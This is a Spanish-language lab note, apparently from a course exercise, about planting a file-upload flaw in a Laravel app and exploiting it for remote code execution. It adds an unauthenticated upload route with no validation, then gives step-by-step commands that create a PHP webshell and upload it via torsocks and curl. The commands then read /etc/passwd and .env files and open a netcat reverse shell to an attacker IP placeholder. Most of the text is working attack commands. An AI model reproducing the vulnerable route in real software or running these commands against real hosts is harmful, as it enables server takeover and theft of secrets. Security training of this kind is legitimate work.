# 04 - File Upload / RCE

**Responsable:** Alexander

## Archivo modificado
`routes/web.php`

## Cambio realizado
Se agregó una ruta POST `/upload` sin autenticación ni validación de tipo de archivo.

```php
// 🔥 VULNERABLE - Agregar en web.php:
use Illuminate\Support\Facades\Storage;

Route::post('/upload', function (Request $request) {
    $file = $request->file('file');
    $name = $file->getClientOriginalName();
    $file->move(public_path('uploads'), $name);
    return response()->json(['path' => '/uploads/' . $name]);
});
```

## Explotación

### Paso 1: Crear webshell
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Paso 2: Subir webshell
```bash
torsocks curl -X POST "http://192.168.18.31:8001/upload" \
  -F "file=@shell.php"
```

### Paso 3: Ejecutar comandos
```bash
torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=id"
torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=whoami"
torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=uname+-a"
torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=cat+/etc/passwd"
torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=ls+-la+/"
```

### Comandos avanzados
```bash
# Ver estructura del proyecto
torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=ls+-la+/var/www/html"

# Ver config (si existe)
torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=cat+.env"

# Reverse shell (netcat)
torsocks curl "http://192.168.18.31:8001/uploads/shell.php?cmd=nc+-e+/bin/bash+TU_IP+4444"
```

## Resultado esperado
- Subir archivo PHP malicioso
- Ejecutar comandos del sistema remotamente
